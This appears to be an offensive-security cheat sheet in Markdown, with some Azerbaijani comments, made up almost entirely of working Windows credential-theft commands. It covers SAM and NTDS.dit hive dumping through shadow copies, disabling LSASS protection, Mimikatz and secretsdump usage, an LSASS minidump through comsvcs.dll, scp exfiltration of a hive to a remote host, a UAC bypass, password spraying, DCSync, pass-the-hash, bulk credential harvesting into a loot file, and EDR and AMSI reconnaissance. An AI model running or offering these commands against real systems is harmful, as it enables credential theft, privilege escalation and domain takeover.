
# SAM Dump

```bash
SAM ( Security Account Manager )

# Path
C:\Windows\System32\config\SAM ( NTLM Hashes ) HKLM\SAM
C:\Windows\System32\config\SYSTEM ( Decrypted Function ) HKLM\SYSTEM
C:\Windows\System32\config\SECURITY ( Security Policy ) HKLM\SECURITY\Policy\Secrets


# Need Privileges:
  SeBackupPrivilege
  SeDebugPrivilege

# Disable RunAsPPL
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f

# Shadow Copy
vssadmin list shadows ( List Available Shadows )

vssadmin create shadow /for=C:   -->   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Temp\SECURITY

vssadmin delete shadows /for=C: /quiet

# Reg 
Run as nt authority\system: psexec.exe -s -i cmd.exe
reg.exe save HKEY_LOCAL_MACHINE\SYSTEM C:\Temp\SYSTEM /y 
reg.exe save HKEY_LOCAL_MACHINE\SAM C:\Temp\SAM /y
reg.exe save HKEY_LOCAL_MACHINE\SECURITY C:\Temp\SECURITY /y

# Mimikatz
privilege::debug
token::elevate
lsadump::sam
lsadump::lsa /patch

# File Uploader
scp C:\Windows\System32\config\SYSTEM sako@192.168.0.250:/home/sako/Labaratory/ ( SSH File Sender )

# Hash Cracker
pip3 install impacket
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   User       RID            LMHASH                            NTLMHASH

# Hash Dump with netexec
netexec smb <IP> --local-auth -u <USER> -p <PASS> --lsa
netexec smb <IP> --local-auth -u <USER> -p <PASS> --sam
```

# LSASS Dump

```bash

# Check RunAsPPL
LSASS Dump Technique:
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -ErrorAction SilentlyContinue
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPLBoot -ErrorAction SilentlyContinue

Dəyər Yoxdursa RunAsPPL = 0

# Dump Technique 1
Task Manager --> Local Security Authority Process --> Create dump file ( %temp% )

# Dump Technique 2
CMD: tasklist /svc
PowerShell: Get-Process lsass

rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```



# Credential Center Dump

```bash
# Windows Vault Path:
%SystemRoot%\System32\config\systemprofile\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\

# Technique 1
rundll32 keymgr.dll,KRShowKeyMgr
cmdkey /list

Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles

runas /savecred /user:SRV01\mcharles cmd

# UAC Bypass
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```



# NTDS.dit

```bash

# NTDS Path
C:\Windows\NTDS\ntds.dit

./username-anarchy -i <NAMES_Wordlist>
crackmapexec smb <IP> ( Find Domain Name )

# Kerbrute
Kerberos TGT requests Event ID 4768

kerbrute userenum -d company.local --dc 10.10.10.5 users.txt
kerbrute passwordspray -d company.local --dc <IP> users.txt Winter2025!
kerbrute bruteuser -d company.local --dc <IP> passwords.txt ali.aliyev

# Netexec
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

vssadmin create shadow /for=C:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

# Secretsdump
python3 secretsdump.py company.local/admin:Pass@10.10.10.5
python3 secretsdump.py -just-dc company.local/admin:Pass@DC-IP


# DCSync
secretsdump.py -just-dc-user krbtgt company.local/admin@DC-IP
python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Pass The Hash
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```



# Credential Hunting 

```bash

# Lazagne
start lazagne.exe all
python3 lazagne.py all

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Console History
C:\Users\[USER]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# SYSVOL
\\domain.local\SYSVOL\domain.local\

# SYSVOL Shares
Get-ChildItem "\\domain.local\SYSVOL" -Recurse -File -ErrorAction SilentlyContinue |
Select-String -Pattern "password|passwd|pwd|creds|credential" |
Select Path, LineNumber, Line

# SYSVOL cpassword ( AES encrypted admin password )
Get-ChildItem "\\domain.local\SYSVOL" -Recurse -File -Include *.xml |
Select-String "cpassword"

# IT or Shared checker
$shares = "\\fileserver\IT","\\fileserver\Shared"
foreach ($share in $shares) {
    Get-ChildItem $share -Recurse -File -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|passwd|pwd|token|apikey|secret" |
    Select Path, LineNumber, Line
}

# Application secrets
Get-ChildItem "\\fileserver" -Recurse -File -Include web.config -ErrorAction SilentlyContinue |
Select-String -Pattern "password=|connectionString|user id" |
Select Path, Line

# Auto reply files ( Maybe find Admin password )
Get-ChildItem -Path C:\ -Recurse -File -Include unattend.xml,sysprep.xml -ErrorAction SilentlyContinue |
Select-String -Pattern "password"

# AD User Description field
Get-ADUser -Filter * -Properties Description |
Where-Object {$_.Description -match "pass|pwd|password"} |
Select Name, Description

# AD Computer Description field
Get-ADComputer -Filter * -Properties Description |
Where-Object {$_.Description -match "pass|pwd|password"} |
Select Name, Description

# Password Vault
Get-ChildItem C:\ -Recurse -File -Include *.kdbx -ErrorAction SilentlyContinue

# Users Credential finder
$keywords = "*.txt","*.docx","*.xlsx","*.csv"
Get-ChildItem C:\Users -Recurse -File -Include $keywords -ErrorAction SilentlyContinue |
Where-Object {$_.Name -match "pass|password|credential|login"} |
Select FullName

# Get-ChildItem "\\fileserver\Share" -Recurse -File -ErrorAction SilentlyContinue |
Where-Object {$_.Name -match "pass|password"} |
Select FullName

# Full Credential Harvesting
$patterns = "password","passwd","pwd","credential","token","apikey","secret"
Get-ChildItem -Path C:\ -Recurse -File -ErrorAction SilentlyContinue |
Select-String -Pattern $patterns |
Select Path, LineNumber, Line |
Out-File C:\loot\password_hits.txt
```


# General Check:

```bash
Credential Guard (VBS / LSA Isolation) Status Yoxlama:

# Method 1: WMI Query (Ən dəqiq)
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object VirtualizationBasedSecurityStatus, VirtualizationsBasedSecurityApplications

# Method 2: Registry Check
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name * -ErrorAction SilentlyContinue
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LsaCfgFlags -ErrorAction SilentlyContinue

CachedDrtmAuthIndex             : 0 Amma Aktiv deyil
RequireMicrosoftSignedBootChain : 1 Sistemdə mövcud olduğunu göstərir

# Method 3: Quick One-liner
(Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard).VirtualizationBasedSecurityStatus
| Dəyər | Mənası                         |
| ----- | ------------------------------ |
| 0     | VBS Disabled                   |
| 1     | VBS Enabled (amma **işləmir**) |
| 2     | VBS Enabled **və Running**     |



LSASS Protected Process Light (PPL) Status:

# Registry Check (RunAsPPL)
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
reg query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v RunAsPPL

# PowerShell Detection Script
$lsa = Get-WmiObject Win32_Process | Where-Object {$_.Name -eq "lsass.exe"}
$lsa.GetOwner() # Access Denied = PPL Active
__GENUS          : 2                Kernel Level Protection
__CLASS          : __PARAMETERS     
__SUPERCLASS     :
__DYNASTY        : __PARAMETERS
__RELPATH        :
__PROPERTY_COUNT : 3
__DERIVATION     : {}
__SERVER         :
__NAMESPACE      :
__PATH           :
Domain           : NT AUTHORITY     
ReturnValue      : 0 
User             : SYSTEM          PPL Not Exists
PSComputerName   :



EDR / XDR / Davranış əsaslı Detection Yoxlama:

# EDR Process Detection
Get-Process | Where-Object {$_.ProcessName -match "(crowdstrike|carbonblack|sentinel|cybereason|carbon|cb|csagent|edr|defenderatp)"}

# Common EDR Services
Get-Service | Where-Object {$_.Name -match "(csagent|cb|sentinelone|crowdstrike|elastic|sysmon|carbonblack|morphisec|cybereason|defender|cylance|crowdstrike|falcon)"}

# Sysmon Active Check
Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0 -and $_.LogName -like "*Sysmon*"}

# AMSI Status
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)

# ETW Providers (Advanced EDR Detection)
wevtutil qe Security /c:1 /rd:true /f:text | findstr "Audit"



Disk & Offline Protection Check
# BitLocker Status
manage-bde -status C:
Get-BitLockerVolume | Select-Object MountPoint, VolumeStatus, ProtectionStatus

# Windows Defender Real-time Protection
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring, MAPSReporting

# Tamper Protection
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name *Tamper*

# Offline Files / Encryption
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\csc" -Name Start -ErrorAction SilentlyContinue

# Volume Shadow Copy (VSS) Status
Get-Service vss | Select-Object Name, Status, StartType
vssadmin list shadows



One-Liner:

Write-Host "=== Credential Guard / LSASS / EDR Detection ===" -ForegroundColor Cyan

# -------------------------------
# Credential Guard / VBS
# -------------------------------
$VBSStatus = "Not Available"
try {
    $dg = Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard `
                          -ClassName Win32_DeviceGuard -ErrorAction Stop
    if ($dg.VirtualizationBasedSecurityStatus -eq 2) {
        $VBSStatus = "ENABLED (BLOCKED)"
    } else {
        $VBSStatus = "DISABLED"
    }
} catch {}

Write-Host "VBS / Credential Guard: $VBSStatus" -ForegroundColor `
    $(if($VBSStatus -like "ENABLED*"){'Red'}elseif($VBSStatus -eq "DISABLED"){'Green'}else{'DarkGray'})

# -------------------------------
# LSASS PPL
# -------------------------------
$PPLValue = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
            -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL

$PPLStatus = if ($PPLValue -eq 1) {"ENABLED (BLOCKED)"} else {"DISABLED"}

Write-Host "LSASS PPL: $PPLStatus" -ForegroundColor `
    $(if($PPLValue -eq 1){'Red'}else{'Green'})

# -------------------------------
# EDR (User-mode check)
# -------------------------------
$EDR = Get-Process -ErrorAction SilentlyContinue |
       Where-Object {$_.ProcessName -match "crowdstrike|carbonblack|sentinel|cybereason|falcon|cb|csagent"}

$EDRCount = if ($EDR) {$EDR.Count} else {0}

Write-Host "EDR Processes Detected: $EDRCount" -ForegroundColor `
    $(if($EDRCount -gt 0){'Red'}else{'Green'})

# -------------------------------
# Microsoft Defender
# -------------------------------
$DefenderStatus = "Not Available"
try {
    $Def = Get-MpComputerStatus -ErrorAction Stop
    $DefenderStatus = if ($Def.AntispywareEnabled) {"ENABLED"} else {"DISABLED"}
} catch {}

Write-Host "Defender Real-Time Protection: $DefenderStatus" -ForegroundColor `
    $(if($DefenderStatus -eq "ENABLED"){'Yellow'}elseif($DefenderStatus -eq "DISABLED"){'Green'}else{'DarkGray'})

# -------------------------------
# BitLocker
# -------------------------------
$BitLockerStatus = "Not Available"
$manageBDE = Get-Command manage-bde -ErrorAction SilentlyContinue

if ($manageBDE) {
    try {
        $BL = manage-bde -status C: 2>$null | Select-String "Protection Status"
        if ($BL) {
            $BitLockerStatus = $BL.ToString().Trim()
        }
    } catch {}
}

Write-Host "BitLocker: $BitLockerStatus" -ForegroundColor Yellow
```








